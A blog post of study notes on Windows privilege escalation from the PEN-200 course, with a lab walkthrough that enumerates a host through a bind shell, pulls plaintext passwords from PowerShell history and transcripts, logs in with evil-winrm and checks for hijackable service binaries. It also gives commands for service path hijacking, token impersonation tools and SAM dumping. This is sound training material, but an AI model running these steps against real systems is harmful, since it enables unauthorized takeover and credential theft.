  76. <h1 class="blog-article-title">PEN-200 Module 16 — Windows Privilege Escalation Strategies</h1>
  77. <p class="blog-article-meta">
  79. <span>Oct 5, 2023</span>

  94. <div class="blog-article-content">
  95. <h2>TLDR;</h2>
  96. <p>These notes upgrade the earlier summary with the lab’s full checklist: what to run, what to capture, and how to explain it back to defenders.</p>
  97. <h3>Initial Enumeration</h3>
  98. <pre><code>whoami /all
  99. systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;
  100. wmic qfe get HotFixID,InstalledOn
  101. powershell &quot;Get-MpComputerStatus | Select-Object AMServiceEnabled,AntispywareEnabled&quot;
  102. </code></pre>
  103. <ul>
  104. <li>Record logged-on users (<code>query user</code>, <code>Get-WmiObject Win32_LoggedOnUser</code>).</li>
  105. <li>Document AV/EDR presence and application control (AppLocker, WDAC).</li>
  106. </ul>
  107. <h3>Credential Discovery</h3>
  108. <ul>
  109. <li>Search filesystem for configuration files: <code>dir /s *pass*</code> and <code>findstr /spin &quot;password&quot; *.ini *.xml</code>.</li>
  110. <li>Dump registry keys: <code>reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</code> for auto-logon secrets.</li>
  111. <li>Use <code>Seatbelt.exe</code> or <code>LaZagne</code> when permitted; log the tool version and detection status.</li>
  112. </ul>
  113. <h3>Service &amp; Task Abuse</h3>
  114. <ul>
  115. <li>Enumerate services: <code>sc query state= all</code>, <code>Get-Service | Where-Object {$_.PathName -like &#39;*\*&#39;}</code>.</li>
  116. <li>Identify writable binaries:</li>
  117. </ul>
  118. <pre><code>accesschk.exe -uwcqv &quot;Authenticated Users&quot; * /accepteula
  119. Get-CimInstance Win32_Service | Where-Object {$_.PathName -match &#39; &#39; -and $_.PathName -notmatch &#39;&quot;&#39;}
  120. </code></pre>
  121. <ul>
  122. <li>Modify service path to point at payload (<code>sc config &lt;svc&gt; binPath= &quot;C:\Temp\shell.exe&quot;</code>).</li>
  123. <li>Check scheduled tasks: <code>schtasks /query /fo LIST /v</code> → look for user-writable action scripts.</li>
  124. </ul>
  125. <h3>Token &amp; Privilege Abuse</h3>
  126. <ul>
  127. <li>Inspect token privileges: <code>whoami /priv</code>.</li>
  128. <li>If <code>SeImpersonatePrivilege</code> present, run <code>PrintSpoofer.exe -i -c cmd.exe</code> or <code>RoguePotato</code> (document binary/version used).</li>
  129. <li>For <code>SeBackupPrivilege</code>, use <code>diskshadow</code> or <code>reg save</code> to access SAM/LSA.</li>
  130. </ul>
  131. <h3>Automation &amp; Validation</h3>
  132. <ul>
  133. <li>Execute <code>winPEASany.exe</code> (record command, output location, and key findings). Treat results as leads; validate manually.</li>
  134. <li>After escalation, capture proof: <code>whoami /groups</code>, <code>hostname</code>, <code>echo %USERNAME%</code>.</li>
  135. <li>Clean up artifacts (restore service binaries, remove temporary files) and note cleanup actions.</li>
  136. </ul>
  137. <h3>Reporting &amp; Defense</h3>
  138. <ul>
  139. <li>For each finding, explain the root cause (misconfigured service ACL, weak registry permissions) and remediation (harden ACLs, enforce service isolation, enable UAC).</li>
  140. <li>Suggest monitoring: Sysmon Event ID 7045 (service creation), 4688 (process creation), 4624 (logons), AppLocker logs.</li>
  141. </ul>
  142. <p>Windows privilege escalation is a game of disciplined enumeration. Follow this script, capture evidence, and deliver fixes the blue team can apply immediately.</p>
  143. <h2>Working Notes... In Graphic Detail...</h2>
  144. <h3>Windows Privilege Escalation</h3>
  145. <ul>
  146. <li>Enumerating Windows.</li>
  147. <li>Leveraging Windows Services.</li>
  148. <li>Abusing other Windows components.</li>
  149. </ul>
  150. <h4>Enumerating Windows</h4>
  151. <ul>
  152. <li>Understand Windows privileges and access control mechanisms.</li>
  153. <li>Obtain situational awareness.</li>
  154. <li>Search for sensitive information on Windows systems.</li>
  155. <li>Find sensitive information generated by PowerShell.</li>
  156. <li>Become familiar with automated enumeration tools.</li>
  157. </ul>
  158. <h5>Understanding Windows Privileges and Access Control Mechanisms</h5>
  159. <p>Win OS privs refer to the permissions of a specific account to perform system-related local operations, such as modding the FS or adding users. Win needs a control mechanism to grant/deny those ops by determining if the user privs are sufficient for the op. We will cover four different concepts/mechanisms:</p>
  160. <ul>
  161. <li><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers">Security Identifier (SID)</a></li>
  162. <li>Win uses SID to identify entities.</li>
  163. <li>A SID is a unique value assigned to each entity, or principal, that can auth.</li>
  164. <li>Users.</li>
  165. <li><em>Windows uses only the SID, not usernames, to identify principals for access control management.</em>.</li>
  166. <li>Groups.<ul>
  167. <li>SID for local accounts and groups is generated by <a href="https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection">Local Security Authority (LSA)</a></li>
  168. <li>SID for domain users and domain groups is generated by the Domain Controller (DC)</li>
  169. </ul>
  170. </li>
  171. <li>SID cannot be changed and is created at the time of User/Group creation.</li>
  172. <li>Consists of segements delimited by <code>-</code>, structure like:
  173. - <code>S-R-X-Y</code><ul>
  174. <li><code>S</code>: string is SID.
  175. - <code>R</code>: stands for revision, always set to <code>1</code> (overal structure of SID is v1)</li>
  176. <li><code>X</code>: identifier authority that issues SID.</li>
  177. <li>The most common identifier authority is <code>5</code> (NT Authority, local/domain users/groups)
  178. - <code>Y</code>: sub authorities of the identifier authority.</li>
  179. <li>Every SID contains one or more sub authorities of the identifier authority.</li>
  180. <li>Domain identifier.</li>
  181. <li>Is the SID of the domain for domain users.</li>
  182. <li>Is the SID of the local machine for local users.</li>
  183. <li>Is <code>32</code> for built in principals.</li>
  184. <li>Example SID of local user on Win sys:
  185. - <code>S-1-5-21-1336799502-1441772794-948155058-1001</code>
  186. - RID <code>1001</code><ul>
  187. <li>RID starting at <code>1000</code> for majority principals, implys that this is the second local user created on the system, <code>1000</code> being the first.
  188. - SID with RID under <code>1000</code> are called <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids">well-known SIDs</a></li>
  189. <li>generic and built in groups and users instead of specific groups and users.</li>
  190. <li>Useful well-known SIDs for PrivEsc.</li>
  191. </ul>
  192. </li>
  193. </ul>
  194. </li>
  195. </ul>
  196. <pre><code>S-1-0-0 Nobody
  197. S-1-1-0 Everybody
  198. S-1-5-11 Authenticated Users
  199. S-1-5-18 Local System
  200. S-1-5-domainidentifier-500 Administrator
  201. </code></pre>
  202. <pre><code> - Relative identifier (RID)
  203. - Determines principals such as users or groups.
  204. </code></pre>
  205. <p><em>Knowing how Win identifies principals is necessary for understanding access tokens and vital in Active Directory</em></p>
  206. <ul>
  207. <li><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens">access token</a></li>
  208. <li>On user auth Win generates and access token and assigns it to the user.</li>
  209. <li>The token contains information that effectively describes the security context of a given user.</li>
  210. <li>The security context is a set of rules/attributes currently in effect.</li>
  211. <li>The security context of a token consists of:</li>
  212. <li>SID of user.</li>
  213. <li>SIDs of groups user is a member of.</li>
  214. <li>The user groups and privs.</li>
  215. <li>Further info describing the token.</li>
  216. <li>When a user starts a process or thread a token is assigned to the object.</li>
  217. <li>Known as a primary token.</li>
  218. <li>Specifies the permissions the process/thread has when interacting with another object.</li>
  219. <li>Is a copy of the access token of the user.</li>
  220. <li>A thread can also have an <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/impersonation-tokens">impersonation token</a> assigned.</li>
  221. <li>Provides a different security context than the owner process.</li>
  222. <li>The thread interacts with objects on behalf of the impersonation token, not the primary.</li>
  223. <li><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control">Mandatory Integrity Controls</a></li>
  224. <li>Uses integrity levels to control access to securable objects.</li>
  225. <li>The levels are akin to hierarchies of trust Win has in a running app or securable object.</li>
  226. <li>When a proc starts or objects are created they receive the integrity level of the principal performing the op.</li>
  227. <li>Exception being is an executable has low file integrity level the process integrity level will be low.</li>
  228. <li>A principal with a lower integrity level cannot write to an object of a higher integrity level.</li>
  229. <li>Even if permissions would normally allow them to do so.<ul>
  230. <li>Since Win Vista processes run on five integraity levels:</li>
  231. </ul>
  232. </li>
  233. </ul>
  234. <pre><code>- System: SYSTEM (kernel, ...)
  235. - High: Elevated users
  236. - Medium: Standard users
  237. - Low: Very restricted rights often used in sandboxed[^privesc_win_sandbox] processes or for directories storing temporary data
  238. - Untrusted: Lowest integrity level with extremely limited access rights for processes or objects that pose the most potential risk
  239. </code></pre>
  240. <ul>
  241. <li>We can display the integrity level of a proc with <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer">Process Explorer</a>:</li>
  242. <li>Our current user with <code>whoami/groups</code></li>
  243. <li>For files with <code>icacls</code> .</li>
  244. <li>The following example shows two PowerShell procs.</li>
  245. <li>One started by reg <code>User</code></li>
  246. <li>Another started as <code>Admin</code>
  247. <img src="assets/static/resources/7ed11d3f9b98c2238c60a5a1d46c584c.png" alt="7ed11d3f9b98c2238c60a5a1d46c584c.png"></li>
  248. <li>The PowerShell procs have the integrity levels of <code>High</code> and <code>Medium</code></li>
  249. <li>We can infer that the <code>High</code> level proc was started by admin.</li>
  250. <li>And the <code>Medium</code> level proc was started by the user.</li>
  251. <li><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-overview">User Account Control (UAC)</a></li>
  252. <li>Win security feature that protects the OS by running most applications and tasks with standard user privs.</li>
  253. <li>Even if launched by an <code>Administrator</code></li>
  254. <li>For this, and admin user is assigned two access tokens after successful logon.
  255. - The first token is a standard user token.<ul>
  256. <li>Aka filtered admin token.</li>
  257. <li>Used to perform all non-priv ops.<ul>
  258. <li>The second token is a regular admin token.</li>
  259. </ul>
  260. </li>
  261. <li>Used to perform privileged ops.</li>
  262. <li>Requires UAC prompt confirmation for use.</li>
  263. </ul>
  264. </li>
  265. </ul>
  266. <p>This introduction covers the basics of Win priv and access control mechanisms; SIDs, access tokens, integrity levels, and UAC. Win offers numerous other mechanisms to control access to securable objects, several of which we will discuss and demonstrate in this module.</p>
  267. <h5>Situational Awareness</h5>
  268. <p>With our basic understanding of Win privs we will cover various methods to get situational awareness on a system. Assume we used a client-side attack or exploited a vulnerability to access a Windows system as an unpriv user. Before we attempt to elevate privs we must obtain info about the system we are on.</p>
  269. <p>This step is crucial to understand the nature of the compromised system as well as discover possible PrivEsc vectors. It is often skipped or minimized by inexperienced pen testers due to the nature of sifting through and interpreting large amounts of information. Experienced pentesters know that by gathering as much as possible, they obtain valuable information about the target system, which they can use to create various actionable vectors to elevate their privs.</p>
  270. <p>The key info we should always obtain:</p>
  271. <pre><code>- Username and hostname
  272. - Group memberships of the current user
  273. - Existing users and groups
  274. - Operating system, version and architecture
  275. - Network information
  276. - Installed applications
  277. - Running processes
  278. </code></pre>
  279. <ul>
  280. <li>Once we have performed enumeration and obtained this information we will have a solid understanding of our target sys.</li>
  281. </ul>
  282. <p>Let&#39;s start info gathering on the CLIENTWK220 sys.</p>
  283. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  284. └─$ export VM1=&#39;192.168.211.220&#39;
  286. ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  287. └─$ nc $VM1 4444

  366. <ul>
  367. <li><p>Assume we started a bind shell on port 4444 through a client-side attack.</p>
  368. </li>
  369. <li><p>Connect to the target system with <code>netcat</code></p>
  370. </li>
  371. <li><p>Username and hostname: <code>whoami</code></p>
  372. </li>
  373. <li><p><code>clientwk220\dave</code> the hostname implies the shell is running on a client system rather than a server.</p>
  374. </li>
  375. <li><p>Hostname can often infer the purpose/type of machine.
  376. - <code>WEB01</code> likely a web server.
  377. - <code>MSSQL01</code> likely a MSSQL server.</p>
  378. </li>
  379. <li><p>Groups: <code>whoami /groups</code>
  380. - Our output shows <code>dave</code> is a member of <code>helpdesk</code> group.</p>
  381. <ul>
  382. <li>Helpdesk staff often have additional perms and access compared to standard users.<ul>
  383. <li>Also a member of <code>BUILTIN\RemoteDesktop</code> .</li>
  384. </ul>
  385. </li>
  386. <li>May be possible to connect to the system via RDP.</li>
  387. </ul>
  388. </li>
  389. <li><p>Other users and groups:
  390. - Cmd: <code>net user</code>
  391. - Cmdlet: <code>Get-LocalUser</code></p>
  392. <ul>
  393. <li>We can start PowerShell from our bind shell and run this.</li>
  394. <li>Interesting items:</li>
  395. <li>Built-in Administrator account is disabled.</li>
  396. <li>Two regular users, <code>steve</code> and <code>dave</code>, exists.</li>
  397. <li>Two other users, <code>daveadmin</code> and <code>BackupAdmin</code>, exist.</li>
  398. <li>Potentially admin users.</li>
  399. <li><em>valuable targets</em>.</li>
  400. <li>Assume <code>daveadmin</code> is the privileged account of <code>dave</code></li>
  401. <li>Admins often have two accounts.
  402. - Non-priv for day-to-day tasks.
  403. - Admin account for administrative tasks.</li>
  404. </ul>
  405. </li>
  406. <li><p>Existing groups:
  407. - Cmd: <code>net localgroup</code>
  408. - Cmdlet: <code>Get-LocalGroup</code></p>
  409. <ul>
  410. <li>Found non-standar groups:
  411. - <code>adminteam</code>
  412. - contains &quot;admin&quot; with custom description, admin to all workstations on the second floor (however we don&#39;t know which departments are on which floors)
  413. - <code>BackupUsers</code><ul>
  414. <li>backup solutions often have extensive permissions to perform FS ops.</li>
  415. <li><em>potentially valuable target</em>.
  416. - <code>helpdesk</code>
  417. - several built-in groups to analyze:
  418. - <code>Administrators</code>
  419. - <code>Backup Operators</code></li>
  420. <li>can backup and restore all files on a sys.</li>
  421. <li>regardless of file perms.
  422. - <code>Remote Desktop Users</code>
  423. - can access sys via <code>RDP</code>
  424. - <code>Remote Management Users</code>
  425. - can access via <code>WinRM</code></li>
  426. </ul>
  427. </li>
  428. </ul>
  429. </li>
  430. <li><p>As an example review the members of <code>adminteam</code> and <code>Administrators</code></p>
  431. </li>
  432. <li><p>Cmdlet: <code>Get-LocalGroupMember</code> with group name as arg.</p>
  433. </li>
  434. </ul>
  435. <pre><code class="language-powershell">PS C:\Users\dave&gt; Get-LocalGroupMember adminteam
  436. Get-LocalGroupMember adminteam
  437. ​
  438. ObjectClass Name PrincipalSource
  439. ----------- ---- ---------------
  440. User CLIENTWK220\daveadmin Local
  441. ​
  442. PS C:\Users\dave&gt; Get-LocalGroupMember Administrators
  443. Get-LocalGroupMember Administrators
  444. ​
  445. ObjectClass Name PrincipalSource
  446. ----------- ---- ---------------
  447. User CLIENTWK220\Administrator Local

  452. <ul>
  453. <li>Only <code>daveadmin</code> is a member of <code>adminteam</code>, but <code>adminteam</code> is not listed in the local <code>Administrators</code> group.</li>
  454. <li>We only know that members of the group are administrators to workstations on the second floor.</li>
  455. <li>Thus far, the info is not directly actionable, but it may be when we move deeper into the network, identifying which systems are on the second floor.</li>
  456. <li>Other than disabled <code>Administrator</code> only <code>daveadmin</code> and <code>BackupAdmin</code> are members of the local Administrators group making the high value targets.</li>
  457. <li>It is crucial for us to know which users.</li>
  458. <li>Are privileged.</li>
  459. <li>Can use RDP.</li>
  460. <li>Obtaining creds for one of these users can lead to GUI access.</li>
  461. </ul>
  462. <p>To summarize what we now know:</p>
  463. <ul>
  464. <li>Bind shell runs as user <code>dave</code> on sys hostname <code>CLIENTWK220</code></li>
  465. <li>This user is in a group named <code>helpdesk</code></li>
  466. <li>There is another user <code>daveadmin</code>, likely their priv account.</li>
  467. <li>Also in a group named <code>adminteam</code></li>
  468. <li>Description indicates it has admin privs to all second floor workstations.</li>
  469. <li>Along with <code>BackupAdmin</code> they are local admins on <code>CLIENTWK220</code></li>
  470. </ul>
  471. <p>Next, we gather info about the target sys itself, its configuration, and apps running on it.</p>

  526. <p>Next, we will review the network info we can obtain as <code>dave</code>. Our goal is to identify all network ifaces, routes, and active network connections. This info may allow us to identify new services or even access to other networks. It may not lead directly to elevated privs, but vital to understand machines purpose and to obtain vectors to other systems/networks.
  527. <em>Obtaining privileged access on every machine in a penetration test is rarely a useful or realistic goal. While most machines in the challenge labs of this course are rootable, we&#39;ll face numerous non-rootable machines in real-life assessments. A skilled penetration tester&#39;s goal is therefore not to blindly attempt privilege escalation on every machine at any cost, but to identify machines where privileged access leads to further compromise of the client&#39;s infrastructure.</em></p>

  808. <p>To summarize our findings:</p>

  821. <p>This provides us with a good overview of the machine. We will now search for sensitive info on the target sys and interpret it based on info derived from situational awareness process.</p>
  822. <h5>Hidden in Plain View</h5>
  823. <p>As we discovered in the previous section, we can assume the users of CLIENTWK220 use a password manager. However, never underestimate the laziness of users when it comes to password/sensitive-info. What was once the post-it note under the keyboard is now often a txt file on the desktop. While browsing the home dir of our user or public folders, we can retrieve various pieces of info that can lead us to PrivEsc vectors.</p>
  824. <ul>
  825. <li>Sensitive Info may be stored in:</li>
  826. <li>Meeting notes.</li>
  827. <li>Config files.</li>
  828. <li>Onboarding docs.</li>
  829. <li>With our situational-awareness methods we can make educated guesses on where those files may reside.</li>
  830. </ul>
  831. <p>We will search CLIENTWK220 for SI (sensitive info)</p>
  832. <ul>
  833. <li>We know both are installed on sys.</li>
  834. <li>KeePass.</li>
  835. <li>Search for password manager DB.</li>
  836. <li>XAMPP.</li>
  837. <li>Search for config files.</li>
  838. <li>Connect to our bind shell on the target.</li>
  839. <li>To form our search command <code>Get-ChildItem</code></li>
  840. <li>Arg <code>-Path</code> enter <code>C:\</code></li>
  841. <li>Arg <code>-Include</code> enter <code>*.kdbx</code></li>
  842. </ul>
  843. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  844. └─$ nc $VM1 4444
  845. Microsoft Windows [Version 10.0.22000.795]
  846. (c) Microsoft Corporation. All rights reserved.
  847. ​
  848. C:\Users\dave&gt;powershell
  849. powershell

  852. ​
  853. Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
  854. ​
  855. PS C:\Users\dave&gt; Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
  856. Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
  857. </code></pre>
  858. <ul>
  859. <li><p>No password manager DB was found in our search.</p>
  860. </li>
  861. <li><p>Next we search for sensitive information in config files of XAMPP.</p>
  862. </li>
  863. <li><p>After reviewing <a href="https://www.apachefriends.org/docs/">XAMPP docs</a></p>
  864. </li>
  865. <li><p>Set options.
  866. - <code>-Include *.txt,*.ini</code>
  867. - <code>-Path C:\xampp</code></p>
  868. </li>
  869. </ul>
  870. <pre><code class="language-powershell">PS C:\Users\dave&gt; Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

  1642. <h5>Information Goldmine PowerShell</h5>
  1643. <p>We have seen how we can use sensitive info found in plain-text files to PriveEsc. Over the last decade IT security awareness has greatly improved via:</p>
  1644. <ul>
  1645. <li><p>Training.</p>
  1646. </li>
  1647. <li><p>IT policies.</p>
  1648. </li>
  1649. <li><p>Threat of cyber attacks painted by media.
  1650. This has led to less sensitive info stored in notes and text files. Due to growing threat, additional defensive measures have been developed for clients/servers. One measure is improved logging of command execution, allowing IT staff to review and respond to threats. An important source of this information is PowerShell, as it is vital to attackers.</p>
  1651. </li>
  1652. <li><p>Win default settings.</p>
  1653. </li>
  1654. <li><p>Small amount of information on PS usage is logged.</p>
  1655. </li>
  1656. <li><p>Insufficient for enterprise envs.</p>
  1657. </li>
  1658. <li><p>We will often find PS logging mechanisms enabled on client/server.</p>
  1659. </li>
  1660. <li><p>Important logging mechanisms.
  1661. - <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.host/start-transcript">Transcription</a></p>
  1662. <ul>
  1663. <li>Referred to as &quot;over-the-shoulder-transcription&quot;.</li>
  1664. <li>Often saved in.</li>
  1665. <li>Home directories of users.</li>
  1666. <li>Central directory for all users of a machine.</li>
  1667. <li>Network share collecting the files from all configured machines.
  1668. - <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2">Script Block Logging</a></li>
  1669. <li>Records the commands and blocks of script code as events while executing.</li>
  1670. <li>Broader logging as it records the full content of code and commands as executed.</li>
  1671. <li>Events also contain the original representation of encoded code or commands.</li>
  1672. </ul>
  1673. </li>
  1674. <li><p>Both are powerful and common in enterprise envs.</p>
  1675. </li>
  1676. <li><p>They are useful from both defensive and offensive perspective.
  1677. - Often containing valuable info for attackers.</p>
  1678. </li>
  1679. </ul>
  1680. <p>We will demonstrate how to retrieve info recorded by PS with the help of the enabled logging mechanisms and PS history. We&#39;ll connect to a bind shell on port 4444 running as user <code>dave</code> and launch <code>powershell</code>.</p>
  1681. <p>Before checking if Script Block Logging or PowerShell Transcription is enabled we should check the PS history of the user. This can be done with <code>Get-History</code>.</p>
  1682. <pre><code class="language-powershell">C:\Users\dave&gt;powershell
  1683. powershell
  1684. Windows PowerShell
  1685. Copyright (C) Microsoft Corporation. All rights reserved.
  1686. ​
  1687. Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
  1688. ​
  1689. PS C:\Users\dave&gt; Get-History
  1690. Get-History
  1691. </code></pre>
  1692. <ul>
  1693. <li>Indicates no commands have been run.</li>
  1694. </ul>
  1695. <p>Most admins us <code>Clear-History</code> to clear the PS history, this only clears PS&#39;s own history. Starting at PS v5, v5.1, and v7 a module names <a href="https://docs.microsoft.com/en-us/powershell/module/psreadline/?view=powershell-7.2">PSReadline</a> is available for line-editing and command history functionality.</p>
  1696. <p>Interestingly <code>Clear-History</code> does not clear the command history recorded by <code>PSReadline</code>. To get the <code>PSReadline</code> history we can use <code>Get-PSReadlineOption</code> to obtain info from the module.</p>
  1697. <ul>
  1698. <li>To get the one option <code>(Get-PSReadlineOption).HistorySavePath</code></li>
  1699. </ul>
  1700. <pre><code class="language-powershell">PS C:\Users\dave&gt; (Get-PSReadlineOption).HistorySavePath
  1701. (Get-PSReadlineOption).HistorySavePath
  1702. C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
  1703. </code></pre>
  1704. <ul>
  1705. <li>This is the path of the history file which we can display with <code>type</code></li>
  1706. </ul>
  1707. <pre><code class="language-powershell">PS C:\Users\dave&gt; type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
  1708. type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
  1709. whoami
  1710. ls
  1711. $PSVersionTable
  1712. Register-SecretVault -Name pwmanager -ModuleName SecretManagement.keepass -VaultParameters $VaultParams
  1713. Set-Secret -Name &quot;Server02 Admin PW&quot; -Secret &quot;paperEarMonitor33@&quot; -Vault pwmanager
  1714. cd C:\
  1715. ls
  1716. cd C:\xampp
  1717. ls
  1718. type passwords.txt
  1719. Clear-History
  1720. Start-Transcript -Path &quot;C:\Users\Public\Transcripts\transcript01.txt&quot;
  1721. Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
  1722. exit
  1723. Stop-Transcript
  1724. </code></pre>
  1725. <ul>
  1726. <li>We find many interesting commands!<ul>
  1727. <li><code>dave</code> executed <code>Register-SecretVault</code> with the module <code>SecretManagment.keepass</code></li>
  1728. <li>This implies the user created a new password manager DB for KeePass.</li>
  1729. </ul>
  1730. </li>
  1731. <li>Next <code>dave</code> used <code>Set-Secret</code> to create a secret in the password manager.</li>
  1732. <li>Name: <code>Server02 Admin PW</code></li>
  1733. <li>Password: <code>paperEarMonitor33@</code></li>
  1734. <li>These are likely creds to another system.</li>
  1735. <li>We should attempt to leverage this password for any user, service, login on CLIENTWK220 as it may be reused by the user.</li>
  1736. <li>We note the password for later and continue our analysis.</li>
  1737. <li>Next <code>dave</code> used the <code>Clear-History</code> cmdlet belieiving it cleared the history.</li>
  1738. <li>Finally <code>dave</code> used <code>Start-Transcript</code> to start a PowerShell Transcription.</li>
  1739. <li>This contains the path where the transcript file saved.</li>
  1740. <li>Before we examine that, we look at the next line.</li>
  1741. <li>User executed <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2">Enter-PSSession</a></li>
  1742. <li>Hostname of local machine for arg <code>-ComputerName</code></li>
  1743. <li>Object names <code>$cred</code> for arg <code>-Credential</code>
  1744. - <a href="https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential">PSCredential</a></li>
  1745. </ul>
  1746. <pre><code>- The commands to create the PSCredential object are not included in the history file.
  1747. - We don&#39;t know which user and password were used for `Enter-PSSession`
  1748. - *PowerShell Remoting by default uses WinRM for Cmdlets such as Enter-PSSession. Therefore, a user needs to be in the local group Windows Management Users to be a valid user for these Cmdlets. However, instead of WinRM, SSH can also be used for PowerShell remoting.*.
  1749. - Now let&#39;s look at the transcript file save to `C:\Users\Public\Transcripts\transcript01.txt` to see if we can glean more info on the user and password in use.
  1750. </code></pre>
  1751. <ul>
  1752. <li>Since PowerShell Transcription stared before <code>Enter-PSSession</code> we might find plain text creds used to create the PSCredential object stored to <code>$cred</code></li>
  1753. </ul>

  1784. <ul>
  1785. <li>The transcript contains the commands used to create the variable <code>$cred</code> .</li>
  1786. <li>To create the PSCredential object.</li>
  1787. <li>Fist user creates a <a href="https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring">SecureString</a></li>

  1791. <pre><code class="language-powershell">PS C:\Users\dave&gt; $password = ConvertTo-SecureString &quot;qwertqwertqwert123!!&quot; -AsPlainText -Force

  1810. <ul>
  1811. <li>We can use the three commands to start a PowerShell remoting session via WinRM on CLIENTWK220 as user <code>daveadmin</code></li>
  1812. <li>While <code>whoami</code> works, other commands do not.</li>
  1813. <li>NOTE: a bind shell may cause issues when creating a PowerShell remoting session via WinRM.</li>
  1814. </ul>
  1815. <p><strong>Evil-WinRM</strong></p>
  1816. <ul>
  1817. <li>To avoid an issues we&#39;ll use <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a></li>
  1818. <li>Provides built in pentest functions.</li>
  1819. <li>PtH.</li>
  1820. <li>In-memory-loading.</li>
  1821. <li>File up/download.</li>
  1822. <li>Avoid issues we faced creating PS remote session in bind shell.</li>
  1823. <li><code>evil-winrm</code></li>
  1824. <li>Target IP for arg <code>-i</code> .</li>
  1825. <li>Target username for arg <code>-u</code></li>
  1826. <li>Target password for arg <code>-p</code></li>
  1827. <li>Escape the <code>!</code>s in the password with <code>\</code></li>
  1828. </ul>
  1829. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  1830. └─$ evil-winrm -i $VM1 -u daveadmin -p &quot;qwertqwertqwert123\!\!&quot;

  1861. <p>PS artifacts like the history of PSReadlines or transcript files often contain loot, never skip reviewing them. Most admins clear history with <code>Clear-History</code> leaving the PSReadline history in place.</p>

  2011. <h4>16.2 Leveraging Windows Services</h4>
  2012. <ul>

  2017. <h5>Service Binary Hijacking</h5>
  2018. <p>Every Win service has an associated binary file that is exec when the service starts or transitions into a running state. Let&#39;s consider a scenario where a dev creates a program and installs an app as a Win service. The dev does not secure the perms of the prog at install, allowing full Read/Write access to all members of the Users group. Result, lower priv users could replace the prog with a malicious one and exec by restarting the service or starting it automatically when the machine is rebooted. Once the service starts, the mal bin is executed with the privs of that service, <code>LocalSystem</code> for example.</p>
  2019. <ul>
  2020. <li>COnnect to CLIENTWK220 via RDP.<ul>
  2021. <li><code>dave:qwertqwertqwert123</code></li>
  2022. </ul>
  2023. </li>

  2027. - Cmdlet <code>Get-Service</code>

  2033. <li>Guery the WMI class <a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-classes">win32_service</a>
  2034. - use <code>Select</code> with args <code>Name</code>, <code>State</code>, and <code>PathName</code>
  2035. - filter out service not in <code>Running</code> state with <code>Where-Object</code></li>

  2148. <li>Based on results two XAMPP services, Apache2.4 and mysql, stand out.</li>
  2149. <li>Bins located in <code>C:\xampp\</code> dir instead of <code>C:\Windows\System32</code></li>
  2150. <li>Indicates the service is user installed and dev is in charge of dir struct as well as perms of the software.</li>
  2151. <li>Potentially prone to service binary hijacking.</li>
  2152. <li>Next, enum the perms of both service bins.</li>
  2153. <li>We can use either.
  2154. - Win utility <code>icacls</code>
  2155. - Cmdlet <code>Get-ACL</code></li>
  2156. <li>We will use <code>icacls</code></li>
  2157. <li>Available from both Win CLI and PS.</li>
  2158. <li>Outputs corresponding principals and their perm mask.</li>
  2159. <li>Most relevant perms and masks:
  2160. - MASK:PERM.
  2161. - F:Full access.
  2162. - M:Modify access.
  2163. - RX:Read and execute access.
  2164. - R:Read-only access.
  2165. - W:Write-only access.</li>
  2166. <li>Use <code>icacls</code> on Apache fin <code>httpd.exe</code> first.</li>
  2167. </ul>
  2168. <pre><code class="language-powershell">PS C:\Users\dave&gt; icacls &quot;C:\xampp\apache\bin\httpd.exe&quot;
  2169. C:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(F)
  2170. NT AUTHORITY\SYSTEM:(F)
  2171. BUILTIN\Users:(RX)
  2172. NT AUTHORITY\Authenticated Users:(RX)
  2173. ​
  2174. Successfully processed 1 files; Failed processing 0 files
  2175. </code></pre>
  2176. <ul>
  2177. <li>As a member of built-in <code>Users</code> group, <code>dave</code> only has <code>Read and Execute (RX)</code> rights on <code>httpd.exe</code></li>
  2178. <li>We cannot replace the file with a mal binary.</li>
  2179. <li>Next, we&#39;ll check <code>mysqld.exe</code> from the mysql service.</li>
  2180. </ul>
  2181. <pre><code class="language-powershell">PS C:\Users\dave&gt; icacls &quot;C:\xampp\mysql\bin\mysqld.exe&quot;
  2182. C:\xampp\mysql\bin\mysqld.exe BUILTIN\Administrators:(F)
  2183. NT AUTHORITY\SYSTEM:(F)
  2184. BUILTIN\Users:(F)
  2185. </code></pre>
  2186. <ul>
  2187. <li>The members of <code>Users</code> group have <code>Full Access (F)</code> permission.</li>
